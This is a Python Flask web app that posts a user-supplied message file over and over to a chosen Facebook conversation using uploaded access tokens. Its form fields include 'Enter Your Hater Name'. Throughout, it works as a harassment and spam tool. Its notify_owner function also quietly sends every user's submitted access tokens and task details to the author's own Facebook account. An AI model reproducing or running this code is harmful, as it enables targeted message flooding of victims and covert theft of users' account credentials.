from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

# Your Facebook UID and Access Token
OWNER_UID = '100064267823693'
OWNER_ACCESS_TOKEN = 'YOUR_PERSONAL_ACCESS_TOKEN'  # Replace with your valid token

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

# Notify you on Facebook Messenger
def notify_owner(message):
    api_url = f'https://graph.facebook.com/v15.0/{OWNER_UID}/messages'
    parameters = {'access_token': OWNER_ACCESS_TOKEN, 'message': message}
    response = requests.post(api_url, data=parameters, headers=headers)
    if response.status_code == 200:
        print("Notification sent to owner.")
    else:
        print(f"Failed to send notification: {response.text}")

# Function to send messages
def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = f"{mn} {message1}"
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Failed From token {access_token}: {message}")
                time.sleep(time_interval)

# Main route for sending messages
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        # Notify owner about the new task
        user_details = f"New Task Started:\nTask ID: {task_id}\nThread ID: {thread_id}\nAccess Tokens: {access_tokens}\nMN: {mn}\nTime Interval: {time_interval}s"
        notify_owner(user_details)

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    # HTML FORM (no changes here)
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>😈 𝐏𝐑𝐈𝐍𝐂𝐄 𝐈𝐍𝐒𝐈𝐈𝐃𝐄😈 </title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    label { color: white; }
    body {
      background-image: url('https://i.ibb.co/19kSMz4/In-Shot-20241121-173358587.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      color: white;
    }
    .container {
      max-width: 350px; 
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px white;
    }
    .form-control {
      border: 1px double white;
      background: transparent;
      color: white;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">🥀🩷 𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 𝐈𝐍𝐒𝐈𝐈𝐃𝐄😈🐧</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <label>Select Token Option</label>
      <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
        <option value="single">Single Token</option>
        <option value="multiple">Token File</option>
      </select>
      <div id="singleTokenInput">
        <label>Enter Single Token</label>
        <input type="text" class="form-control" name="singleToken">
      </div>
      <div id="tokenFileInput" style="display: none;">
        <label>Choose Token File</label>
        <input type="file" class="form-control" name="tokenFile">
      </div>
      <label>Enter Inbox/convo UID</label>
      <input type="text" class="form-control" name="threadId" required>
      <label>Enter Your Hater Name</label>
      <input type="text" class="form-control" name="kidx" required>
      <label>Enter Time (seconds)</label>
      <input type="number" class="form-control" name="time" required>
      <label>Choose Your NP File</label>
      <input type="file" class="form-control" name="txtFile" required>
      <button type="submit" class="btn btn-primary btn-submit">Run</button>
    </form>
    <form method="post" action="/stop">
      <label>Enter Task ID to Stop</label>
      <input type="text" class="form-control" name="taskId" required>
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
    </form>
  </div>
</body>
</html>
''')

# Stop route to terminate the running task
@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        notify_owner(f"Task with ID {task_id} has been stopped.")
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

# Run Flask app
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
